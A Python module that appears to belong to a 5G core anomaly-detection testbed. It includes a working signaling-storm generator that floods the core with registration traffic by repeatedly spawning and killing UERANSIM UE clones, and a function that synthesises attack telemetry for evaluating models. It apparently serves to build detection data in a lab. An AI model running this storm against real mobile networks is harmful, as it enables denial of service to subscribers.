"""
Signaling storm attack generator.

Simulates a zero‑day signaling storm by rapidly spawning cloned UERANSIM
UEs that flood the 5G core with:
  - Mass simultaneous NGAP registration requests
  - Repeated authentication failures
  - Rapid attach / detach cycling

When UERANSIM is not available, produces a *simulated* burst of attack
telemetry directly in memory for offline testing.
"""

from __future__ import annotations

import subprocess
import time
from pathlib import Path
from typing import Dict, List, Optional

import numpy as np
import pandas as pd

from core.ella_config import EllaConfig, get_config


def launch_signaling_storm(
    num_clones: int = 50,
    burst_duration_seconds: float = 30.0,
    attach_detach_interval: float = 0.3,
    ueransim_path: Optional[Path] = None,
    ue_config_path: Optional[Path] = None,
) -> List[Dict]:
    """
    Launch a signaling storm using UERANSIM cloned UEs.

    Each clone rapidly attaches and detaches, overwhelming the core
    with registration / deregistration signaling.

    Parameters
    ----------
    num_clones : int
        Number of simultaneous malicious UEs.
    burst_duration_seconds : float
        Total duration of the attack burst.
    attach_detach_interval : float
        Seconds between each attach/detach cycle.
    ueransim_path : Path, optional
        UERANSIM installation root.
    ue_config_path : Path, optional
        Path to the malicious UE YAML config.

    Returns
    -------
    list[dict]
        Logged attack events.
    """
    events: List[Dict] = []
    start = time.time()

    print(f"[attack] Launching signaling storm: {num_clones} clones, "
          f"{burst_duration_seconds}s burst")
    print(f"[attack] {'='*50}")

    if ueransim_path and ue_config_path:
        binary = ueransim_path / "build" / "nr-ue"
        processes = []

        while (time.time() - start) < burst_duration_seconds:
            for i in range(num_clones):
                try:
                    proc = subprocess.Popen(
                        ["sudo", str(binary), "-c", str(ue_config_path)],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    processes.append(proc)
                    events.append({
                        "time": time.time(),
                        "event": "STORM_ATTACH",
                        "clone_id": i,
                    })
                except FileNotFoundError:
                    break

            time.sleep(attach_detach_interval)

            # Kill all clones to force deregistration
            for proc in processes:
                try:
                    proc.kill()
                except Exception:
                    pass
            processes.clear()

            events.append({
                "time": time.time(),
                "event": "STORM_DETACH_ALL",
                "count": num_clones,
            })
    else:
        # Simulation mode — just log events
        cycle = 0
        while (time.time() - start) < burst_duration_seconds:
            events.append({
                "time": time.time(),
                "event": "STORM_CYCLE",
                "cycle": cycle,
                "clones": num_clones,
            })
            cycle += 1
            print(f"[attack]   Storm cycle {cycle}: "
                  f"{num_clones} simultaneous registrations")
            time.sleep(attach_detach_interval)

    print(f"[attack] {'='*50}")
    print(f"[attack] Storm complete — {len(events)} events over "
          f"{time.time() - start:.1f}s")
    return events


def generate_attack_telemetry(
    duration_seconds: float = 60.0,
    poll_interval: float = 1.0,
    intensity: float = 1.0,
    seed: int = 123,
) -> pd.DataFrame:
    """
    Generate simulated *attack* telemetry matching the same schema as the
    normal telemetry from ``telemetry.collector``.

    This is the "attack" counterpart used for model evaluation when
    Ella Core is not running.

    Parameters
    ----------
    duration_seconds : float
        Duration of the attack data.
    poll_interval : float
        Sampling interval.
    intensity : float
        Multiplier (1.0 = default storm intensity, higher = worse).
    seed : int
        RNG seed.

    Returns
    -------
    pd.DataFrame
        Attack telemetry with spiked metrics.
    """
    rng = np.random.default_rng(seed)
    num_samples = int(duration_seconds / poll_interval)
    rows = []

    for i in range(num_samples):
        rows.append({
            "timestamp": f"attack_{i}",
            "elapsed": round(i * poll_interval, 3),
            "app_ngap_messages_total": float(rng.poisson(150 * intensity)),
            "app_nas_messages_total": float(rng.poisson(120 * intensity)),
            "app_active_sessions": float(max(1, int(rng.normal(50, 15)))),
            "app_registration_requests_total": float(rng.poisson(80 * intensity)),
            "app_auth_failures_total": float(rng.poisson(40 * intensity)),
            "app_request_latency_seconds": float(
                max(0.001, rng.normal(0.25 * intensity, 0.08))
            ),
        })

    df = pd.DataFrame(rows)
    print(f"[attack] Generated {len(df)} attack telemetry samples "
          f"(intensity={intensity:.1f}x)")
    return df


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Launch signaling storm attack")
    parser.add_argument("--clones", type=int, default=50)
    parser.add_argument("--duration", type=float, default=10.0)
    parser.add_argument("--simulated", action="store_true")
    args = parser.parse_args()

    if args.simulated:
        df = generate_attack_telemetry(duration_seconds=args.duration)
        print(df.head())
    else:
        events = launch_signaling_storm(
            num_clones=args.clones,
            burst_duration_seconds=args.duration,
        )
        print(f"Total events: {len(events)}")
